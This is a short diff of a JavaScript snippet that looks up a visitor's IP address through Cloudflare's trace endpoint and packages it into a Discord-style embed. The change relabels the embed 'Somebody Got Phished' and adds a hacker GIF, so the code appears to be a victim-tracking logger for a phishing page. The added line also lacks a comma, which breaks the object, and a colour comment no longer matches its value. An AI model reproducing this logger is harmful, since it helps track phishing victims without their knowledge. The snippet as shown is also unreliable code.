@@ -49,9 +49,10 @@ fetch("https://www.cloudflare.com/cdn-cgi/trace")
     const embed = {
       embeds: [
         {
-          title: "Website Visitor Info",
-          color: 3447003, // Blue color
+          title: "Somebody Got Phished",
+          color: 15158332, // Blue color
           fields: [{ name: "IP Address", value: ip, inline: true }],
+          image : {url:"https://tenor.com/view/breezy-hacker-im-in-matrix-laptop-gif-22983973"}
           timestamp: new Date(),
         },
       ],
